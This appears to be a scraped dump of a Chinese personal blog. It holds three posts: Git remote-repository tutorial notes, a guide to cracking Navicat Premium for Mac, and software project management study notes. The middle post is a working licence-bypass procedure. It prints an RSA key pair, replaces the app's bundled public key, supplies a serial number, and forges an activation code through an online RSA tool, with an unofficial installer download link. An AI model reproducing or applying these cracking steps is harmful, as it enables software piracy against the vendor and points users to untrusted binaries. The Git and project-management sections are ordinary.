你仍可以通过远程仓库拿回你丢失的数据。 还有就是, 远程让代码社交化了! 既然你的项目被托管到别的地方了, 你的朋友可以更容易地为你的项目做贡献(或者拉取最新的变更) 现在用网站来对远程仓库进行可视化操作变得越发流行了(像 GitHub 或 Phabricator), 但远程仓库永远是这些工具的顶梁柱, 因此理解其概念非常的重要! 基本操作git clone从技术上来讲，git clone 命令在真实的环境下的作用是在本地创建一个远程仓库的拷贝（比如从 github.com） 1git clone 远程分支git clone之后我们注意到的第一个事就是在我们的本地仓库多了一个名为 o/master 的分支, 这种类型的分支就叫远程分支。由于远程分支的特性导致其拥有一些特殊属性。 远程分支反映了远程仓库(在你上次和它通信时)的状态。这会有助于你理解本地的工作与公共工作的差别 —— 这是你与别人分享工作成果前至关重要的一步. 远程分支有一个特别的属性，在你检出时自动进入分离 HEAD 状态。Git 这么做是出于不能直接在这些分支上进行操作的原因, 你必须在别的地方完成你的工作, （更新了远程分支之后）再用远程分享你的工作成果。 因此，如果你看到一个名为 origin/master 的分支，那么这个分支就叫 master，远程仓库的名称就是 origin 如果检出远程分支会怎么样呢？12git checkout o&#x2F;mastergit commit 正如你所见，Git 变成了分离 HEAD 状态，当添加新的提交时 o/master 也不会更新。这是因为 o/master 只有在远程仓库中相应的分支更新了以后才会更新。 git fetchGit 远程仓库相当的操作实际可以归纳为两点：向远程仓库传输数据以及从远程仓库获取数据。既然我们能与远程仓库同步，那么就可以分享任何能被 Git 管理的更新（因此可以分享代码、文件、想法、情书等等）。 本节课我们将学习如何从远程仓库获取数据 —— 命令如其名，它就是 git fetch。 你会看到当我们从远程仓库获取数据时, 远程分支也会更新以反映最新的远程仓库。1git fetch 就是这样了! C2,C3 被下载到了本地仓库，同时远程分支 o/master 也被更新，反映到了这一变化 git fetch 做了些什么：git fetch 完成了仅有的但是很重要的两步: 从远程仓库下载本地仓库中缺失的提交记录 更新远程分支指针(如 o/master) git fetch 实际上将本地仓库中的远程分支更新成了远程仓库相应分支最新的状态。 如果你还记得上一节课程中我们说过的，远程分支（origin/master）反映了远程仓库在你最后一次与它通信时的状态，git fetch 就是你与远程仓库通信的方式了！希望我说的够明白了，你已经了解 git fetch 与远程分支之间的关系了吧。 git fetch 通常通过互联网（使用 http:// 或 git:// 协议) 与远程仓库通信。 git fetch 不会做的事：git fetch 并不会改变你本地仓库的状态。它不会更新你的 master 分支，也不会修改你磁盘上的文件。 理解这一点很重要，因为许多开发人员误以为执行了 git fetch 以后，他们本地仓库就与远程仓库同步了。它可能已经将进行这一操作所需的所有数据都下载了下来，但是并没有修改你本地的文件。我们在后面的课程中将会讲解能完成该操作的命令 :D 所以, 你可以将 git fetch 的理解为单纯的下载操作。 git pull既然我们已经知道了如何用 git fetch 获取远程的数据, 现在我们学习如何将这些变化更新到我们的工作当中。 其实有很多方法的 —— 当远程分支中有新的提交时，你可以像合并本地分支那样来合并远程分支。也就是说就是你可以执行以下命令: git cherry-pick o/mastergit rebase o/mastergit merge o/master等等 实际上，由于先抓取更新再合并到本地分支这个流程很常用，因此 Git 提供了一个专门的命令来完成这两个操作。它就是我们要讲的 git pull。 先来看看fetch和merge分别执行的效果：12git fetchgit merge o&#x2F;master 我们用 fetch 下载了 C3, 然后通过 git merge o/master 合并了这一提交记录。现在我们的 master 分支包含了远程仓库中的更新（在本例中远程仓库名为 origin） 接下来试试git pull1git pull同样的结果！这清楚地说明了 git pull 就是 git fetch 和 git merge 的缩写！ git pushOK，我们已经学过了如何从远程仓库获取更新并合并到本地的分支当中。这非常棒……但是我如何与大家分享我的成果呢？ 嗯，上传自己分享内容与下载他人的分享刚好相反，那与 git pull 相反的命令是什么呢？git push！ git push 负责将你的变更上传到指定的远程仓库，并在远程仓库上合并你的新提交记录。一旦 git push 完成, 你的朋友们就可以从这个远程仓库下载你分享的成果了！ 你可以将 git push 想象成发布你成果的命令。它有许多应用技巧，稍后我们会了解到，但是咱们还是先从基础的开始吧…… 注意 —— git push 不带任何参数时的行为与 Git 的一个名为 push.default 的配置有关。在你的项目中进行推送之前，最好检查一下这个配置。 1git push 偏离的历史记录现在我们已经知道了如何从其它地方 pull 提交记录，以及如何 push 我们自己的变更。看起来似乎没什么难度，但是为何还会让人们如此困惑呢？ 困难来自于远程库提交历史的偏离。在讨论这个问题的细节前，我们先来看一个例子…… 假设你周一克隆了一个仓库，然后开始研发某个新功能。到周五时，你新功能开发测试完毕，可以发布了。但是 ——天啊！你的同事这周写了一堆代码，还改了许多你的功能中使用的API，这些变动会导致你新开发的功能变得不可用。但是他们已经将那些提交推送到远程仓库了，因此你的工作就变成了基于项目旧版的代码，与远程仓库最新的代码不匹配了。 这种情况下, git push 就不知道该如何操作了。如果你执行 git push，Git 应该让远程仓库回到星期一那天的状态吗？还是直接在新代码的基础上添加你的代码，亦或由于你的提交已经过时而直接忽略你的提交？ 因为这情况（历史偏离）有许多的不确定性，Git 是不会允许你 push 变更的。实际上它会强制你先合并远程最新的代码，然后才能分享你的工作。 1git push 命令失败了！git push 失败是因为你最新提交的 C3 基于远程分支中的 C1。而远程仓库中该分支已经更新到 C2 了，所以 Git 拒绝了你的推送请求。 那该如何解决这个问题呢？很简单，你需要做的就是使你的工作基于最新的远程分支。 有许多方法做到这一点呢，不过最直接的方法就是通过 rebase 调整你的工作。咱们继续，看看怎么 rebase！ 123git fetchgit rebase o&#x2F;mastergit push 我们用 git fetch 更新了本地仓库中的远程分支，然后用 rebase 将我们的工作移动到最新的提交记录下，最后再用 git push 推送到远程仓库。 还有其它的方法可以在远程仓库变更了以后更新我的工作吗? 当然有，我们还可以使用 merge 尽管 git merge 不会移动你的工作（它会创建新的合并提交），但是它会告诉 Git 你已经合并了远程仓库的所有变更。这是因为远程分支现在是你本地分支的祖先，也就是说你的提交已经包含了远程分支的所有变化。 咱们们用 merge 替换 rebase 来试一下… 123git fetchgit merge o&#x2F;mastergit push 很好！但是要敲那么多命令，有没有更简单一点的？ 当然 —— 前面已经介绍过 git pull 就是 fetch 和 merge 的简写，类似的 git pull –rebase 就是 fetch 和 rebase 的简写！ 12git pull --rebase git push 如果用常规的pull：12git pullgit push 高级操作推送主分支123456git fetchgit rebase o&#x2F;master side1git rebase side1 side2git rebase side2 side3git rebase side3 mastergit push 合并远程仓库为了 push 新变更到远程仓库，你要做的就是包含远程仓库中最新变更。意思就是只要你的本地分支包含了远程分支（如 o/master）中的最新变更就可以了，至于具体是用 rebase 还是 merge，并没有限制。 在开发社区里，有许多关于 merge 与 rebase 的讨论。以下是关于 rebase 的优缺点： 优点: Rebase 使你的提交树变得很干净, 所有的提交都在一条线上 缺点: Rebase 修改了提交树的历史 比如, 提交 C1 可以被 rebase 到 C3 之后。这看起来 C1 中的工作是在 C3 之后进行的，但实际上是在 C3 之前。 一些开发人员喜欢保留提交历史，因此更偏爱 merge。而其他人可能更喜欢干净的提交树，于是偏爱 rebase 123456git checkout mastergit pullgit merge side1git merge side2git merge side3git push 远程追踪分支在前几节课程中有件事儿挺神奇的，Git 好像知道 master 与 o/master 是相关的。当然这些分支的名字是相似的，可能会让你觉得是依此将远程分支 master 和本地的 master 分支进行了关联。这种关联在以下两种情况下可以清楚地得到展示： pull 操作时, 提交记录会被先下载到 o/master 上，之后再合并到本地的 master 分支。隐含的合并目标由这个关联确定的。 push 操作时, 我们把工作从 master 推到远程仓库中的 master 分支(同时会更新远程分支 o/master) 。这个推送的目的地也是由这种关联确定的！ 直接了当地讲，master 和 o/master 的关联关系就是由分支的“remote tracking”属性决定的。master 被设定为跟踪 o/master —— 这意味着为 master 分支指定了推送的目的地以及拉取后合并的目标。 你可能想知道 master 分支上这个属性是怎么被设定的，你并没有用任何命令指定过这个属性呀！好吧, 当你克隆仓库的时候, Git 就自动帮你把这个属性设置好了。 当你克隆时, Git 会为远程仓库中的每个分支在本地仓库中创建一个远程分支（比如 o/master）。然后再创建一个跟踪远程仓库中活动分支的本地分支，默认情况下这个本地分支会被命名为 master。 克隆完成后，你会得到一个本地分支（如果没有这个本地分支的话，你的目录就是“空白”的），但是可以查看远程仓库中所有的分支（如果你好奇心很强的话）。这样做对于本地仓库和远程仓库来说，都是最佳选择。 这也解释了为什么会在克隆的时候会看到下面的输出： local branch “master” set to track remote branch “o/master” 当然了，你也可以自定义这个属性。你可以让任意分支跟踪 o/master, 然后该分支会像 master 分支一样得到隐含的 push 目的地以及 merge 的目标。 这意味着你可以在分支 totallyNotMaster 上执行 git push，将工作推送到远程仓库的 master 分支上。 有两种方法设置这个属性： 第一种就是通过远程分支检出一个新的分支，执行:git checkout -b totallyNotMaster o/master 就可以创建一个名为 totallyNotMaster 的分支，它跟踪远程分支 o/master。 12git checkout -b foo o&#x2F;mastergit pull正如你所看到的, 我们使用了隐含的目标 o/master 来更新 foo 分支。需要注意的是 master 并未被更新！ 同样的，push同样适用： 123git checkout -b foo o&#x2F;mastergit commitgit push我们将一个并不叫 master 的分支上的工作推送到了远程仓库中的 master 分支上 另一种设置远程追踪分支的方法就是使用：git branch -u 命令，执行：git branch -u o/master foo 这样 foo 就会跟踪 o/master 了。如果当前就在 foo 分支上, 还可以省略 foo： git branch -u o/master 123git branch -u o&#x2F;master foo;git commit;git push git push的参数首先来看 git push。在远程跟踪课程中，你已经学到了 Git 是通过当前检出分支的属性来确定远程仓库以及要 push 的目的地的。这是未指定参数时的行为，我们可以为 push 指定参数，语法是： push ```12345678910111213git push origin master把这个命令翻译过来就是：切到本地仓库中的“master”分支，获取所有的提交，再到远程仓库“origin”中找到“master”分支，将远程仓库中没有的提交记录都添加上去，搞定之后告诉我。我们通过“place”参数来告诉 Git 提交记录来自于 master, 要推送到远程仓库中的 master。它实际就是要同步的两个仓库的位置。需要注意的是，因为我们通过指定参数告诉了 Git 所有它需要的信息, 所以它就忽略了我们所检出的分支（HEAD）的属性！![](&#x2F;images&#x2F;assets&#x2F;20200612172052579.png) git checkout c0git push origin master12345![](&#x2F;images&#x2F;assets&#x2F;2020061217213978.png)好了! 通过指定参数, 远程仓库中的 master 分支得到了更新。如果不指定参数会发生什么呢?git checkout c0git push123456789命令失败了! 因为我们所检出的 **HEAD 没有跟踪任何分支**。接下来你可能想问 —— 如果来源和去向分支的名称不同呢？比如你想把本地的 foo 分支推送到远程仓库中的 bar 分支。要同时为源和目的地指定 &lt;place&gt; 的话，只需要用冒号 : 将二者连起来就可以了：&#96;&#96;&#96;git push origin &lt;source&gt;:&lt;destination&gt; 这个参数实际的值是个 refspec，“refspec” 是一个自造的词，意思是 Git 能识别的位置（比如分支 foo 或者 HEAD~1） 一旦你指定了独立的来源和目的地，就可以组织出言简意赅的远程操作命令了 1git push origin foo^:master 这是个另人困惑的命令，但是它确实是可以运行的 —— Git 将 foo^ 解析为一个位置，上传所有未被包含到远程仓库里 master 分支中的提交记录。 如果你要推送到的目的分支不存在会怎么样呢？没问题！Git 会在远程仓库中根据你提供的名称帮你创建这个分支！ 1git push origin master:newBranch git fetch的参数我们刚学习了 git push 的参数，很酷的 &lt;place&gt;参数，还有用冒号分隔的 refspecs（&lt;source&gt;:&lt;destination&gt;）。 这些参数可以用于 git fetch 吗？ 你猜中了！git fetch 的参数和 git push 极其相似。他们的概念是相同的，只是方向相反罢了（因为现在你是下载，而非上传） 如果你像如下命令这样为 git fetch 设置 的话： git fetch origin foo Git 会到远程仓库的 foo 分支上，然后获取所有本地不存在的提交，放到本地的 o/foo 上。 1git fetch origin foo 我们只下载了远程仓库中 foo 分支中的最新提交记录，并更新了 o/foo 你可能会好奇 —— 为何 Git 会将新提交放到 o/foo 而不是放到我本地的 foo 分支呢？之前不是说这样的 参数就是同时应用于本地和远程的位置吗？ 好吧, 本例中 Git 做了一些特殊处理，因为你可能在 foo 分支上的工作还未完成，你也不想弄乱它。还记得在 git fetch 里我们讲到的吗 —— 它不会更新你的本地的非远程分支, 只是下载提交记录（这样, 你就可以对远程分支进行检查或者合并了）。 “如果我们指定 &lt;source&gt;:&lt;destination&gt;会发生什么呢？” 如果你觉得直接更新本地分支很爽，那你就用冒号分隔的 refspec 吧。不过，你不能在当前检出的分支上干这个事，但是其它分支是可以的。 这里有一点是需要注意的 —— source 现在指的是远程仓库中的位置，而 &lt;destination&gt;才是要放置提交的本地仓库的位置。它与 git push 刚好相反，这是可以讲的通的，因为我们在往相反的方向传送数据。 理论上虽然行的通，但开发人员很少这么做。我在这里介绍它主要是为了从概念上说明 fetch 和 push 的相似性，只是方向相反罢了。 git pull的参数既然你已经掌握关于 git fetch 和 git push 参数的方方面面了，关于 git pull 几乎没有什么可以讲的了 :) 因为 git pull 到头来就是 fetch 后跟 merge 的缩写。你可以理解为用同样的参数执行 git fetch，然后再 merge 你所抓取到的提交记录。 1git pull origin master","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"计算机通识","slug":"技术/计算机通识","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/"},{"name":"git版本管理工具","slug":"技术/计算机通识/git版本管理工具","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/git%E7%89%88%E6%9C%AC%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/"}],"tags":[]},{"title":"Navicat-for-mac破解","slug":"Navicat-for-mac破解","date":"2020-06-05T16:00:00.000Z","updated":"2024-05-25T04:21:29.805Z","comments":true,"path":"2020/06/06/Navicat-for-mac破解/","link":"","permalink":"https://wtaufpziv.github.io/2020/06/06/Navicat-for-mac%E7%A0%B4%E8%A7%A3/","excerpt":"Navicat Premium for Mac首先贴上之后需要使用的公钥和私钥：","text":"Navicat Premium for Mac首先贴上之后需要使用的公钥和私钥： 公钥：123456789-----BEGIN PUBLIC KEY-----MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvc8jdtI4y68rvFvRULCYhprieJINbeOkzUBoQVRl2o2VNE5qWy9lNmS7reCfCwqq&#x2F;YQpbKH2dHrhiICviNiMDKRLw1NH+fGDzje3qCHm8tG5EHZQSTyqDe7rI8UDN1W3vk28Snwz97XQ+toVfiA34zGNbWYsKmEBjxXR502ZLwf2oCx64zFZLNJeub0UVrZMLOTSnClPHT0cfFvRdzHBqDGx8KuOUgKBzuPyrUYwF8t5byXdxWwPOaNQu&#x2F;aoEecZX0wbxvu06LmKxfJ6kaUEhoe9ztH4XQNcpxF68O3Z7BNsitkDEzV8G40t&#x2F;uLoE09WHtOD&#x2F;YEW0zLCOlSb74pwtwIDAQAB-----END PUBLIC KEY----- 私钥： 12345678910111213141516171819202122232425262728-----BEGIN PRIVATE KEY-----MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC9zyN20jjLryu8W9FQsJiGmuJ4kg1t46TNQGhBVGXajZU0TmpbL2U2ZLut4J8LCqr9hClsofZ0euGIgK+I2IwMpEvDU0f58YPON7eoIeby0bkQdlBJPKoN7usjxQM3Vbe+TbxKfDP3tdD62hV+IDfjMY1tZiwqYQGPFdHnTZkvB&#x2F;agLHrjMVks0l65vRRWtkws5NKcKU8dPRx8W9F3McGoMbHwq45SAoHO4&#x2F;KtRjAXy3lvJd3FbA85o1C79qgR5xlfTBvG+7TouYrF8nqRpQSGh73O0fhdA1ynEXrw7dnsE2yK2QMTNXwbjS3+4ugTT1Ye04P9gRbTMsI6VJvvinC3AgMBAAECggEADMCE3m&#x2F;DNxP+uTnl9yjWJnzzaCxP0KkxokSIfJMiAKvwcUIvbQ7jGuNrpIPpy4Ec+clOSykaeLrkuhoDMQtzZUoIeQf4Vvd95nXh1d7pODkU2OFKBZGYzzTVAWM0ExykKpnoY4yypRrG&#x2F;oN2XDHn71Cd8tKhdvtrcmSB5KtW9kzSCE3NJrAQ4ABbK5O7+9zaUfsKzhDTjFIu1XX2NYvZQOEP+6z69cA1tg5O1KiPkJT&#x2F;QdHemXhc+PvIbp0txhtX9NWJahz7wmpWoRluCAk7xR+bFFLFiCyhT9TV4Plg8nWW6vtKPy6UPzs7nZW6EKxcR4vIMEOrycdzEoslAqA90QKBgQDiyUpWrN2TsMjcbuRNy0YVg6f6jWdmt1MNWjpt0MTgtdU5dROYWJxSM3z+RF4q9+1gDBQ7lnPgzDeK5b9UArQJRgDkT2kV0QXlyY6Tu7KAk9rhfJyeJRIAp8dZWF8uRPb91xuhhX7NYnniIu4mWN3XPzBcwRjDK3OIiHRRLXnDiQKBgQDWQnS&#x2F;43ZGcKC6Dfo7m7pGqO0G+Nv6Wv&#x2F;Ll8ORJVioKFtfurz136HfAaxTLvlVWjWrru&#x2F;i&#x2F;gQTI3p1Zy&#x2F;r9+Cr97eUSEevABcfhi8K+RuiGl1Pcl6kS3gaywLdo4f9Ho&#x2F;hf+xJ3L0rZAsqUl8tYmQvDMCHzrOPSHApH+05vFpCPwKBgFyOYFuNg4TyQpfMXjrtujWvnM&#x2F;iBBBkw22QpIYLDT7UlygzAwNLLslRoDK5vmD0&#x2F;JkVdPB4z+QwFH8IkxR7YfTi8Bw92JqBy1Fj+F+M3CYjsdITJGxansVLtE1fhsEAfnlM4EcEj6LNDQdg0CcwX6GodVl1qWCGDEntvuMelzJZAoGBAK4NyHgFmRR59CeQqUH5LOav3fV2&#x2F;oSvnfLPM8DafN4GAsyOj2iRphbabhoZI9Vxdf4lG5zjy32cqaNsEuL3N92bW9eqrAj+4snqIJcibI9QKZMbjsSaxlPFrWtNqHA4fpuqZtJN7qKsH+HejpD4x&#x2F;fsvQ7WHMn+B5dw5y6q0wvTAoGARyJjwklaCLJ09+pWlX+d5ygIH+psQ1PuZ&#x2F;avkBViUUQb1HhhBfdzm88Wo5eSlh+1dAsFIZrOQlwQgzyLocPZYIsKLcrR0RAepLL9wCEgtuPACr2RGBr6Aanzzaa7fiMuZbnS9lGCus&#x2F;w0p95iSD&#x2F;QbBGDdt5W9nzPaIStoLLSDM&#x3D;-----END PRIVATE KEY----- 第一步首先下载Mac版 Navicat Premium，下载地址： https://pan.baidu.com/s/14xScgXVAe_mG76rsL95Gcw 密码: b7se```1234567891011121314151617181920## 第二步下载完成之后正常安装，安装完成之后，进入finder，在应用程序一栏中找到我们刚刚安装的Navicat Premium。![](&#x2F;images&#x2F;assets&#x2F;20200604173408542.png)右键点击，找到“显示包内容”![](&#x2F;images&#x2F;assets&#x2F;20200604173649842.png)一次进入下列目录：Contents -&gt; Resources就会找到一个名字是rpk的文件，我们先找个地方将这个文件备份一下，然后直接修改这个文件（双击即可打开）然后将我们上文中提到的公钥覆盖到文件当中![](&#x2F;images&#x2F;assets&#x2F;20200604173947573.png)## 第三步**断网**打开navicat, 根据navicat输入以下序列号&#96;&#96;&#96;NAVG-UJ8Z-EVAP-JAUW 如果右边出现 ✔️，继续。如果右边是黑色的❌,重来。由于断了网，则会出现手动激活的按钮,点击它 然后上方会出现一个请求码，复制它，进行下一步操作 第四步联网 打开这个网站 在线RSA私钥加密解密 如上所示，最上面三个框默认不用改，在下面的“输入加密私钥”一栏中，填写上文中的那个私钥，在下面的“待加密、解密的文本”一栏中，填入上一步的请求码 然后点击“RSA私钥解密”，进入下一步 第五步点击了之后，会在下面出现一个这样的信息： 这个时候，将下面这段代码复制下来找个地方放着1&#123;&quot;K&quot;:&quot;NAVGUJ8ZEVAPJAUW&quot;, &quot;N&quot;:&quot;52pojie&quot;, &quot;O&quot;:&quot;52pojie.cn&quot;, &quot;DI&quot;:&quot;NWRjN2QzNGViODdmYmRl&quot;, &quot;T&quot;: 1547174040&#125; 然后将这段代码中的K和DI两个属性值用上面解密的结果替换掉 然后进入这个网站：时间戳查询 将你注册的时间转换成为时间戳，替换掉上面这段代码的T属性 第六步将替换好的那段代码，放入“待加密、解密的文本”框中，点击RSA加密，得到加密后的文本将下面的结果复制，粘贴到刚刚注册页面请求码下面的那个框中，点击激活即可","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"杂项","slug":"技术/杂项","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E6%9D%82%E9%A1%B9/"},{"name":"软件安装与破解系列","slug":"技术/杂项/软件安装与破解系列","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E6%9D%82%E9%A1%B9/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E4%B8%8E%E7%A0%B4%E8%A7%A3%E7%B3%BB%E5%88%97/"}],"tags":[]},{"title":"软件项目策划与管理知识点汇总","slug":"软件项目策划与管理知识点汇总","date":"2020-05-25T16:00:00.000Z","updated":"2024-05-25T04:21:29.274Z","comments":true,"path":"2020/05/26/软件项目策划与管理知识点汇总/","link":"","permalink":"https://wtaufpziv.github.io/2020/05/26/%E8%BD%AF%E4%BB%B6%E9%A1%B9%E7%9B%AE%E7%AD%96%E5%88%92%E4%B8%8E%E7%AE%A1%E7%90%86%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/","excerpt":"软件项目策划与管知识点汇总","text":"软件项目策划与管知识点汇总 第一章：序言关于软件软件的特征 软件是一种逻辑元素而不是物理元素 软件是开发出来的而不是用传统的方法制造出来的 软件不会被用坏 软件的分类： 系统软件（操作系统） 实时软件（高炉控制软件） 商务软件 工程与科学计算软件 嵌入式软件（安卓） 个人计算机软件 web软件 人工智能软件 。。。 软件危机：指在计算机软件的开发和维护过程中所遇到的一系列严重问题 软件危机的表现 成本高 软件质量得不到保证 进度难以控制 维护非常困难 产生软件危机的原因以及如何解决软件危机 逻辑产品不同于物理产品， 复杂性高 规模大 影响软件生产率和质量的因素比较复杂：人员的能力与水平、团队合作 缺乏有效、系统原理、原则、方法和工具的指导和辅助 解决：既要有技术措施（方法和工具）支持软件开发，又要有必要的组织管理措施 什么是项目（重点）为创造某种独特产品或服务所做的一次性有计划的活动。 项目的要素与特征（重点）一个项目无论大小、特点如何，一般包括下列要素：(1)具体的结果（产品或结果）。(2)明确的开始与结束日期（项目工作开始日期和它的结束日期）。(3)既定的预算（包括人员、资金、设备、设施和资料总额等）。 项目的基本特征表现在： 它有一个明确的目标。每一个项目都是一个特定的项目产品，是为一个明确的目标而成立的。 由一系列互相关联的任务构成。 所有的项目都具有有限的资源。比如时间、人力和成本等。 项目是具有一次性、独特性的活动。它有明确的开始和结束时间，具有临时性 项目的5个阶段（重点） 启动 计划 控制 执行 结束 什么是项目管理（重点）项目管理是在项目活动中应用知识、技能、工具和技术来满足项目需求的过程，它通过初始化，计划，执行，控制和结束等活动来完成。 PMI对项目管理的定义：项目管理就是为了满足甚至超越项目干系人对项目的需求和期望，将理论知识、技能、工具和技巧应用到项目的活动中去，以满足或超过项目干系人的需求和期望。 项目管理是指把各种系统、方法和人员结合在一起，在规定的时间、预算和质量目标范围内完成项目的各项工作。 软件项目生命周期（重点） 开始阶段 中间阶段 最后阶段 软件项目的特征 不可见 灵活 复杂性 软件项目常见问题产品相关的问题： 需求镀金：项目具有比实际需求多得多的性能 功能蔓延：项目平均会有25％的需求变更 开发人员的镀金：开发人员着迷于新技术 又拉又推的交易：经理在批准项目顺延时又加入了新的功能 研究导向的开发 过程相关的问题 缺乏计划 过于乐观的计划 在压力下放弃计划 缺乏足够的风险管理 承包人导致的失败 在模糊的项目前期，浪费时间 前期活动不符合要求 设计低劣 缺少质量保证措施 缺少管理控制 太早和过于频繁的集成 项目估算时遗漏必要的任务 追赶计划 鲁莽编码 技术相关的问题 银弹综合征：过于相信以前没有采用的技术 过高估计新技术和方法带来的节省量 项目中间时切换工具 缺少自动的源代码控制手段 人员相关的问题 挫伤积极性 人员素质低 对有问题的员工失控 英雄主义 项目开发后期加入人员：火上加油 办公环境差 开发人员与客户之间发生摩擦 不现实的预期 缺乏有效的上层支持 缺乏各种角色的互相协作 缺乏用户的介入 政治高于物质 充满想象 第二章 软件项目计划总揽项目计划的作用 指导计划的实施 记载项目计划的前提假设 记载根据选择的方案作出的决策 促进项目人员之间的沟通 确定项目管理的内容、范围和时间 作为度量（实际执行效果与计划作比较）和控制项目进程的基准 项目计划的内容 什么：工作的具体内容，一定时期内的工作重点 怎样：如何完成这些工作和任务 谁：确定具体人员和部门 何时：各项工作需要多少时间 多少：各项工作需要多少费用 哪里：各项工作进行的环境 项目计划的特性动态性要求：项目计划要有弹性职能性：从总体出发，涉及各相关部门相关性：子计划的相互影响系统性：子计划的合理性目标性：目标是灵魂经济性：技术经济分析 软件项目计划的步骤使用的是步进式模型： 选择项目 确定项目的范围和目的 确定项目结构 分析项目特征 确定项目产品与活动 估计每个活动的工作量 确定活动的风险 分配资源 检查和公布计划 执行计划 更细层次上的计划 1. 选择项目（可行性分析）一般需要回答下列问题： 2. 确定项目的范围和目的 确定目标和这些目标的衡量方法 选择项目的责任人（负责人） 确定项目的所有干系人（技术人员，甲方，政府部门等等和项目有关系的人）和兴趣（关注点） 根据项目的干系人的要求分析修改目标 建立各方沟通渠道 3. 确定项目的结构 建立项目和策略计划 建立标准和过程 建立项目团队组织 4.分析项目特征 分析项目是目标驱动还是产品驱动 分析项目的其他特征（针对的行业） 确定项目的高层次的风险（主要风险） 考虑用户实现方面的需求 选择通用的生命周期方法 检查估计资源 5. 确定项目的产品与活动 确定产品的类型：技术产品（如代码）、管理产品（计划说明书） 确定产品的层次性：产品由一些子产品构成，子产品由一些更小的子产品构成 画出产品的分解结构：PBS一个通用的产品模型： 写出一般性的生产流程：产品流程图（PFD） 确定产品实例 定义理想的活动网络：从一个产品产生另一个产品，需要一个或多个活动完成转换。为了确定这些活动，需要一个活动网，以标识活动执行的顺序。这是一个活动网络图（CPN）（图中每一个活动有一个持续时间，可以根据这个图找出一个关键活动，就是耗时最长的活动路径） 考虑阶段和检查点，修改理想的活动网络在实际项目中，一般将项目分解为阶段，并设置检查点。检查点，即里程碑 6. 估计活动的工作量 自底向上的估计 对计划进行修改以生成可控的活动 7.确定活动的风险 识别和量化风险 制定风险降低方法和紧急处理手段（关键人员生病，使用兼职人员） 在考虑风险的基础上调整计划和估计（计划中加入培训活动，或悲观估计） 8. 分配资源 确定和分配资源 在考虑资源约束条件下，修改计划（某些人员承担多个任务，就要考虑任务的优先级） 9. 检查和公布计划 检查项目计划的质量（活动需小组质量检查，前面活动因质量问题需重做） 计划书面化和上报批准 10. 执行计划11. 更细层次上的计划产品分解结构的描述 产品的名称及标识 产品的功能 产品的来源 产品的派生物 产品的形式（用文档或图形表示） 产品的分解结构 相关的标准（如文档的模板） 适用的质量标准（如文档的评价标准） 软件项目的经济性评价（重点）如何估计经济型 自底向上 将任务分解为片段估计每一个片段将片段加起来 自顶向下 从管理者对成本的额度期望出发确定在成本约束条件下能够交付的产品提供管理者多种选择 成本 开发成本 安装成本 运行成本 可能的IT成本 采购成本 启动成本 与项目有关的成本 运行成本 项目经济型评估 净收益：项目生命周期内，总收入与总成本的差额 投资回收期：投资项目所需要的时间（简单来说就是回本的时间） 回收时间越长，项目的风险越大，或者说项目收益不那么具有吸引力。 如果项目的收益比较大，收益就远远大于支出，它就可以在较短时间内回收项目投资，短的回收期通常意味着项目具有更好的收益，所以也可以通过项目的回收期来判断一个项目是否可行。 投资回收期短的不一定净收益高 投资回报率或收益率（ROI） 1平均年收益 &#x3D; 净收益 &#x2F; 年份+ 净现值NPV 一个投资项目的净现值等于一个项目整个生命周期内（时间）预期未来每年净现金流的现值之和减去项目初始投资支出(本金) 判断一个项目是否可行，就要看它的净现值是不是大于零，净现值大于零，意味着项目能够取得收益，它的净收益是正的，也就是说项目的净收益大于净支出，这个项目应该入选，反之不然。 NPV计算公式： NPV：净现值度i－贴现率 NCFt：第t年的营业现金净流量 n：项目寿命周期 i ：预期收益率 举个例子： B公司正考虑一项新的软件开发投资项目，该项目初始投资为40000元，每年的税后现金流如下所示。假设该公司要求的收益率为13%。 所得净现值为负数，证明此方案不可行。 但是NPV也存在问题，当收益率不同时，NPV结果也会随着被影响 内部收益率（IRR）内部收益率就是当NPV为0时的收益率的值，就是上面那个公式知道NPV为0，反推i的值 所以可以很容易得出结论，从项目的角度来说：内部收益率越高越好，但是从公司的角度出发，内部收益率越低越好 可以用内部收益率是否大于期望的标准收益率或者基本收益率（行业投资平均收益率）来判断这个项目是否能够入选。 总结：净现值、内部收益率和回收期，这三个指标通常是用来决定一个项目取舍的主要经济效益指标 第三章 招投标活动招标的工作内容和步骤（重点） 成立招标工作小组； 编制招标文件; 发布招标公告； 进行投标单位资格审查； 组织现场踏勘和招标答疑； 接受投标文件； 组织评标 确定中标单位； 发出中标通知书 签订承发包合同 评标过程（重点） 专家库抽取各方面的的专家 专家人数：5，7，9…，甲方人数1/3以下 确定地点（保密） 监督部门到场 专家评标（根据一定的标准） 专家写出评价意见，推荐中标人 由业主或招标代理写出评价报告 评标方法：主要有打分法和合理低价中标法 第四章 需求工程需求工程的定义与内容（重点） 把所有与需求直接相关的活动通称为需求工程。 需求工程中的活动可分为两大类，一类属于需求开发，另一类属于需求管理。 需求工程的结构图： 需求开发通过调查与分析，获取用户需求并定义产品需求。 需求调查：通过各种途径获取用户的需求信息（原始材料），产生《用户需求说明书》。 需求分析：对各种需求信息进行分析，消除错误，刻画细节等。常见的需求分析方法有“问答分析法”和“建模分析法”两类。 需求定义：根据需求调查和需求分析的结果，进一步定义准确无误的产品需求，产生《产品需求规格说明书》。系统设计人员将依据《产品需求规格说明书》开展系统设计工作 需求管理在客户与开发方之间建立对需求的共同理解，维护需求与其它工作成果的一致性，并控制需求的变更 需求确认：开发方和客户共同对需求文档进行评审，双方对需求达成共识后作出书面承诺，使需求文档具有商业合同效果 